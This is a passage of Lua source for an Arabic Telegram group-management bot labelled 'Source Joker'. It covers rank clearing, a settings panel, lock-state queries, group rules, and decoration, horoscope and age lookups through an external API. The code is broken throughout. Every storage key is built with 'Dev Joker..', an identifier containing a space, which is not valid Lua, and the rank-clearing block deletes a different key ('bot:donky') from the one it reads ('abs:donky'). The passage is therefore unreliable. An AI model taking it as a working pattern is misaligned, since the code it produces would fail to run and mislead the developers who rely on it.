local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنية • المميزين • المطاية ❩ بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end end
--     Source Joker     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not is_absmonsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لمنشئ المجموعه فقط ', 1, 'md')
else
local monsh = DevAbs:smembers(Dev Joker..'abs:monsh:'..msg.chat_id_)
local monshid = DevAbs:smembers(Dev Joker..'abs:monshid:'..msg.chat_id_)
local owners = DevAbs:smembers(Dev Joker..'abs:owners:'..msg.chat_id_)
local admins = DevAbs:smembers(Dev Joker..'abs:admins:'..msg.chat_id_)
local vipmem = DevAbs:smembers(Dev Joker..'abs:vipmem:'..msg.chat_id_)
local donky = DevAbs:smembers(Dev Joker..'abs:donky:'..msg.chat_id_)
if #monsh ~= 0 then monsht = 'المنشئين الاساسيين • ' else monsht = '' end
if #monshid ~= 0 then monshidt = 'المنشئين • ' else monshidt = '' end
if #owners ~= 0 then ownerst = 'المدراء • ' else ownerst = '' end
if #admins ~= 0 then adminst = 'الادمنية • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطاية • ' else donkyt = '' end
if #monsh ~= 0 or #monshid ~= 0 or #owners ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevAbs:del(Dev Joker..'abs:monsh:'..msg.chat_id_)
DevAbs:del(Dev Joker..'abs:monshid:'..msg.chat_id_)
DevAbs:del(Dev Joker..'abs:owners:'..msg.chat_id_)
DevAbs:del(Dev Joker..'abs:admins:'..msg.chat_id_)
DevAbs:del(Dev Joker..'abs:vipmem:'..msg.chat_id_)
DevAbs:del(Dev Joker..'bot:donky:'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع الرتب التاليه ↫ ❨ "..monsht..''..monshidt..''..ownerst..''..adminst..''..vipmemt..''..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then 
if text and text:match("^[Ss]ettings$") or text and text:match("^الاعدادات$") and ChCheck(msg) then
if DevAbs:get(Dev Joker..'bot:muteall'..msg.chat_id_) then mute_all = 'مقفله' else mute_all = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:text:mute'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevAbs:get(Dev Joker..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:video:mute'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then mute_flood = 'مقفله' else mute_flood = 'مفتوحه' end
--     Source Joker     --
if not DevAbs:get(Dev Joker..'flood:max:'..msg.chat_id_) then
flood_m = 5
else
flood_m = DevAbs:get(Dev Joker..'flood:max:'..msg.chat_id_)
end
if not DevAbs:get(Dev Joker..'bot:sens:spam'..msg.chat_id_) then
spam_c = 250
else
spam_c = DevAbs:get(Dev Joker..'bot:sens:spam'..msg.chat_id_)
end
--     Source Joker     --
if DevAbs:get(Dev Joker..'floodstatus'..msg.chat_id_) == "DelMsg" then
floodstatus = "بالحذف"
elseif DevAbs:get(Dev Joker..'floodstatus'..msg.chat_id_) == "Kicked" then
floodstatus = "بالطرد"
elseif not DevAbs:get(Dev Joker..'floodstatus'..msg.chat_id_) then
floodstatus = "بالحذف"
end
--     Source Joker     --
if DevAbs:get(Dev Joker..'bot:music:mute'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:bots:mute'..msg.chat_id_) then mute_bots = 'مقفله' else mute_bots = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevAbs:get(Dev Joker..'editmsg'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:location:mute'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:document:mute'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevAbs:get(Dev Joker..'markdown:lock'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevAbs:get(Dev Joker..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevAbs:get(Dev Joker.."bot:welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevAbs:get(Dev Joker..'fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevAbs:get(Dev Joker..'kaf'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevAbs:get(Dev Joker..'taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevAbs:get(Dev Joker..'farsi'..msg.chat_id_) then lock_farsi = 'مفتوحه' else lock_farsi = 'مقفله' end
--     Source Joker     --
local TXTE = "⌁︙اعدادات المجموعة ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
.."⌁︙الروابط ↫ "..mute_links.."\n"
.."⌁︙المعرف ↫ "..lock_tag.."\n"
.."⌁︙البوتات ↫ "..mute_bots.."\n"
.."⌁︙المتحركه ↫ "..mute_gifs.."\n"
.."⌁︙الملصقات ↫ "..lock_sticker.."\n"
.."⌁︙الملفات ↫ "..lock_file.."\n"
.."⌁︙الصور ↫ "..mute_photo.."\n"
.."⌁︙الفيديو ↫ "..mute_video.."\n"
.."⌁︙الاونلاين ↫ "..mute_in.."\n"
.."⌁︙الدردشه ↫ "..mute_text.."\n"
.."⌁︙التوجيه ↫ "..lock_forward.."\n"
.."⌁︙الاغاني ↫ "..mute_music.."\n"
.."⌁︙الصوت ↫ "..mute_voice.."\n"
.."⌁︙الجهات ↫ "..lock_contact.."\n"
.."⌁︙الماركداون ↫ "..markdown.."\n"
.."⌁︙الهاشتاك ↫ "..lock_htag.."\n"
.."⌁︙التعديل ↫ "..mute_edit.."\n"
.."⌁︙التثبيت ↫ "..lock_pin.."\n"
.."⌁︙الاشعارات ↫ "..lock_tgservice.."\n"
.."⌁︙الكلايش ↫ "..lock_spam.."\n"
.."⌁︙الشبكات ↫ "..lock_wp.."\n"
.."⌁︙المواقع ↫ "..lock_location.."\n"
.."⌁︙الفشار ↫ "..lock_fshar.."\n"
.."⌁︙الكفر ↫ "..lock_kaf.."\n"
.."⌁︙الطائفيه ↫ "..lock_taf.."\n"
.."⌁︙العربيه ↫ "..lock_arabic.."\n"
.."⌁︙الانكليزيه ↫ "..lock_english.."\n"
.."⌁︙الفارسيه ↫ "..lock_farsi.."\n"
.."⌁︙الكل↫ "..mute_all.."\n"
.."⌁︙التكرار ↫ "..mute_flood.."\n"
.."⌁︙خاصية التكرار ↫ "..floodstatus.."\n"
.."⌁︙عدد التكرار ↫ [ "..flood_m.." ]\n"
.."⌁︙عدد السبام ↫ [ "..spam_c.." ]\n"
.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/So_Victor)\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source Joker     --
if text and text:match("^كول (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_Abs(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
--     Source Joker     --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if (text and text == 'تفعيل ردود البوت') and ChCheck(msg) or (text and text == 'تفعيل الردود') and ChCheck(msg) or (text and text == 'تفعيل ردود المطور') and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ردود المطور ،بالتاكيد ،مفعلة ', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل ردود المطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:rep:mute'..msg.chat_id_)
end end
if (text and text == 'تعطيل ردود البوت') and ChCheck(msg) or (text and text == 'تعطيل الردود') and ChCheck(msg) or (text and text == 'تعطيل ردود المطور') and ChCheck(msg) then
if DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ردود المطور ،بالتاكيد ،معطلة ', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل ردود المطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:rep:mute'..msg.chat_id_,true)
end end
end
--     Source Joker     --
if DevAbs:get(Dev Joker..'bot:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ قوانين المجموعة', 1, 'md')
DevAbs:del(Dev Joker..'bot:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(Dev Joker..'bot:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:set(Dev Joker..'bot:rules'..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ قوانين المجموعة', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي القوانين الان', 1, 'md')
DevAbs:set(Dev Joker..'bot:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") then
local rules = DevAbs:get(Dev Joker..'bot:rules'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source Joker     --
if text == "تفعيل الزخرفه" and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الزخرفه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:Zrf:Abs'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الزخرفه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:Zrf:Abs'..msg.chat_id_,true)  
end
--     Source Joker     --
if DevAbs:get(Dev Joker..'Zrf:Abs'..msg.chat_id_..''..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الزخرفه', 1, 'md')
DevAbs:del(Dev Joker..'Zrf:Abs'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "⌁︙قائمة الزخرفه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."⌯ `"..v.."` \n"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevAbs:del(Dev Joker..'Zrf:Abs'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
if not DevAbs:get(Dev Joker..'bot:Zrf:Abs'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg)  then  
DevAbs:setex(Dev Joker.."Zrf:Abs"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الكلمة لزخرفتها \nيمكنك الزخرفة باللغة { en } ⌯ { ar } ', 1, 'md')
end
end
--     Source Joker     --
if not DevAbs:get(Dev Joker..'bot:Zrf:Abs'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") or text and text:match("^زخرف (.*)$") then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "⌁︙قائمة الزخرفه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."⌯ `"..v.."` \n"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source Joker     --
if text == "تفعيل الابراج" and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الابراج بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:Brg:Abs'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الابراج بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:Brg:Abs'..msg.chat_id_,true)  
end
--     Source Joker     --
if not DevAbs:get(Dev Joker..'bot:Brg:Abs'..msg.chat_id_) then
if text and text:match("^برج (.*)$") or text and text:match("^برجي (.*)$") then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Joker     --
if text == "تفعيل حساب العمر" and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل حساب العمر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:Age:Abs'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل حساب العمر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:Age:Abs'..msg.chat_id_,true)  
end
--     Source Joker     --
if not DevAbs:get(Dev Joker..'bot:Age:Abs'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") or text and text:match("^عمري (.*)$") then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.abs
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الروابط$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local ABS_PROX = "\n" .."⌁︙الروابط ↫ "..mute_links.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^المعرف$") or text and text:match("^المعرفات$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then lock_tag = 'مقفولة' else lock_tag = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙المعرف ↫ "..lock_tag.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^البوتات$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:bots:mute'..msg.chat_id_) then mute_bots = 'مقفولة' else mute_bots = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙البوتات ↫ "..mute_bots.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^المتحركه$") or text and text:match("^الملصقات المتحركه$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مقفولة' else mute_gifs = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙المتحركه ↫ "..mute_gifs.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الملصقات$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مقفولة' else lock_sticker = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الملصقات ↫ "..lock_sticker.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الملفات$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:document:mute'..msg.chat_id_) then lock_file = 'مقفولة' else lock_file = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الملفات ↫ "..lock_file.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الصور$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مقفولة' else mute_photo = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الصور ↫ "..mute_photo.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الفيديو$") or text and text:match("^الفيديوهات$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:video:mute'..msg.chat_id_) then mute_video = 'مقفولة' else mute_video = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الفيديو ↫ "..mute_video.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الاونلاين$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local ABS_PROX = "\n" .."⌁︙الاونلاين ↫ "..mute_in.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الدردشه$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:text:mute'..msg.chat_id_) then mute_text = 'مقفلة' else mute_text = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الدردشه ↫ "..mute_text.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^التوجيه$") or text and text:match("^اعاده التوجيه$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local ABS_PROX = "\n" .."⌁︙التوجيه ↫ "..lock_forward.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الاغاني$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:music:mute'..msg.chat_id_) then mute_music = 'مقفولة' else mute_music = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الاغاني ↫ "..mute_music.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الصوت$") or text and text:match("^الصوتيات$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local ABS_PROX = "\n" .."⌁︙الصوت ↫ "..mute_voice.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الجهات$") or text and text:match("^جهات الاتصال$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مقفولة' else lock_contact = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الجهات ↫ "..lock_contact.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الماركداون$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'markdown:lock'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local ABS_PROX = "\n" .."⌁︙الماركداون ↫ "..markdown.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الهاشتاك$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local ABS_PROX = "\n" .."⌁︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^التعديل$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'editmsg'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local ABS_PROX = "\n" .."⌁︙التعديل ↫ "..mute_edit.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^التثبيت$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local ABS_PROX = "\n" .."⌁︙التثبيت ↫ "..lock_pin.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الاشعارات$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مقفولة' else lock_tgservice = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الكلايش$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مقفولة' else lock_spam = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الكلايش ↫ "..lock_spam.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الشبكات$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مقفولة' else lock_wp = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الشبكات ↫ "..lock_wp.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^المواقع$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:location:mute'..msg.chat_id_) then lock_location = 'مقفولة' else lock_location = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙المواقع ↫ "..lock_location.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^العربيه$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مقفولة' else lock_arabic = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙العربيه ↫ "..lock_arabic.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الانكليزيه$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then lock_english = 'مقفولة' else lock_english = 'مفتوحة' end local ABS_PROX = "\n" .."⌁︙الانكليزيه ↫ "..lock_english.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^التكرار$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then mute_flood = 'مقفل' else mute_flood = 'مفتوح' end local ABS_PROX = "\n" .."⌁︙التكرار ↫ "..mute_flood.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الكفر$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'kaf'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local ABS_PROX = "\n" .."⌁︙الكفر ↫ "..lock_kaf.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
